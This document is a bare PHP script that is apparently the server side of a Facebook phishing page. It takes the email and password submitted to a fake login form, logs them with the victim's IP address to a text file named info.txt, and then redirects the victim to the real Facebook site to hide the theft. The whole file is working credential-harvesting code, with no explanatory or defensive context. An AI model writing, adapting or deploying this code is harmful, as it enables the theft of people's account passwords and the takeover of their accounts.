<?php






  $mail =$_POST['mail'];
  $pass = $_POST['pass'];
  
  
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ip= $_SERVER['HTTP_CLIENT_IP'];
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ip= $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
else
    {
      $ip= $_SERVER['REMOTE_ADDR'];
    }
  
  

$ez="\r\n===[$ip]==FACEBOOK=\r\n"; 
$file ='info.txt';
$mm = "Mail:";
$pp ="Pass:";
$e="\r\n------------------------------------------\r\n";
$fp = fopen($file,'a');
fwrite($fp, $ez);
fwrite($fp, $mm);
fwrite($fp, $mail."\r\n");
fwrite($fp, $pp);
fwrite($fp, $pass);
fwrite($fp,$e);

header('Location: https://www.facebook.com');
    
    
    
    






?>

